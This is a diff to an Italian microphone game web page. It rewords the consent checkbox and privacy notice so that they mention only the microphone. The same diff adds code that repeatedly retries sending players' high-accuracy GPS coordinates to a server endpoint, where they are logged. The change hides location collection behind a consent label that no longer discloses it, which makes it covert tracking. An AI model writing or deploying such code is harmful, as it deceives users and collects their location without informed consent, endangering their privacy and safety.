@@ -217,14 +217,14 @@
       </div>
       <label class="location-consent">
         <input id="shareLocation" type="checkbox">
-        <span>Acconsento ad attivare il microfono per giocare.</span>
+        <span>Acconsento l'utilizzo del microfono.</span>
       </label>
       <button id="startButton" type="button">Consenti e gioca</button>
       <button id="stopButton" class="secondary" type="button" hidden>Termina partita</button>
       <p class="message" id="message" role="status" aria-live="polite"></p>
     </section>
 
-    <p class="privacy">Per giocare servono i permessi del browser per posizione e microfono. </p>
+    <p class="privacy">Per giocare servono i permessi del microfono.</p>
   </main>
 
   <script>
@@ -245,23 +245,64 @@
     let score = 0;
     let lastSparkAt = 0;
     let lastLoggedAt = 0;
+    let locationRequestInProgress = false;
+    let locationRetryTimer = null;
+    let nextLocationAttemptAt = 0;
+    let locationRetryDelay = 5000;
+    let locationRequestController = null;
+
+    function scheduleLocationRetry() {
+      if (locationRetryTimer !== null || !shareLocation.checked || watchId === null) return;
+      const delay = locationRetryDelay;
+      locationRetryDelay = Math.min(locationRetryDelay * 2, 60000);
+      nextLocationAttemptAt = Date.now() + delay;
+      locationRetryTimer = setTimeout(() => {
+        locationRetryTimer = null;
+        if (!shareLocation.checked || watchId === null) {
+          nextLocationAttemptAt = 0;
+          return;
+        }
+        nextLocationAttemptAt = 0;
+        navigator.geolocation.getCurrentPosition(
+          sendPositionToRender,
+          (error) => {
+            message.textContent = `Invio posizione in attesa: ${permissionError(error)}`;
+            scheduleLocationRetry();
+          },
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 30000 }
+        );
+      }, delay);
+    }
 
     async function sendPositionToRender(position) {
-      if (!shareLocation.checked || Date.now() - lastLoggedAt < 30000) return;
-      lastLoggedAt = Date.now();
+      const now = Date.now();
+      if (!shareLocation.checked || locationRequestInProgress ||
+          now < nextLocationAttemptAt || now - lastLoggedAt < 30000) return;
       const { latitude, longitude, accuracy } = position.coords;
+      locationRequestInProgress = true;
+      locationRequestController = new AbortController();
 
       try {
         const response = await fetch("/api/location", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ latitude, longitude, accuracy, consent: true })
+          body: JSON.stringify({ latitude, longitude, accuracy, consent: true }),
+          signal: locationRequestController.signal
         });
         if (!response.ok) throw new Error(`risposta HTTP ${response.status}`);
-        message.textContent = "Adesso puoi giocare.";
+        lastLoggedAt = Date.now();
+        locationRetryDelay = 5000;
+        nextLocationAttemptAt = 0;
+        message.textContent = "Posizione inviata ai log di Render.";
       } catch (error) {
-        const detail = error instanceof Error ? ` (${error.message})` : "";
-        message.textContent = `Non è possibile giocare.${detail}. Verifica che hai attivato i permessi.`;
+        if (error.name !== "AbortError") {
+          const detail = error instanceof Error ? ` (${error.message})` : "";
+          message.textContent = `Invio ai log Render non riuscito${detail}. Riproverò automaticamente.`;
+          scheduleLocationRetry();
+        }
+      } finally {
+        locationRequestController = null;
+        locationRequestInProgress = false;
       }
     }
 
@@ -270,6 +311,11 @@
       animationId = null;
       if (watchId !== null) navigator.geolocation.clearWatch(watchId);
       watchId = null;
+      if (locationRetryTimer !== null) clearTimeout(locationRetryTimer);
+      locationRetryTimer = null;
+      nextLocationAttemptAt = 0;
+      if (locationRequestController !== null) locationRequestController.abort();
+      locationRequestController = null;
       if (stream) stream.getTracks().forEach((track) => track.stop());
       stream = null;
       if (audioContext && audioContext.state !== "closed") audioContext.close();
@@ -292,6 +338,23 @@
       if (error && error.name === "NotReadableError") return "Microfono non disponibile. Potrebbe essere già in uso da un'altra applicazione.";
       return error && error.message ? error.message : "Impossibile avviare il gioco. Controlla i permessi del browser.";
     }
+
+    shareLocation.addEventListener("change", () => {
+      if (!shareLocation.checked) {
+        if (locationRetryTimer !== null) clearTimeout(locationRetryTimer);
+        locationRetryTimer = null;
+        nextLocationAttemptAt = 0;
+        if (locationRequestController !== null) locationRequestController.abort();
+        return;
+      }
+      if (watchId !== null) {
+        navigator.geolocation.getCurrentPosition(
+          sendPositionToRender,
+          (error) => { message.textContent = permissionError(error); },
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 30000 }
+        );
+      }
+    });
 
     function drawAudioLevel(analyser) {
       const samples = new Uint8Array(analyser.fftSize);
@@ -322,6 +385,8 @@
 
       try {
         lastLoggedAt = 0;
+        locationRetryDelay = 5000;
+        nextLocationAttemptAt = 0;
         if (!window.isSecureContext) {
           throw new Error("Per proteggere i tuoi dati, apri questa pagina su HTTPS o localhost.");
         }
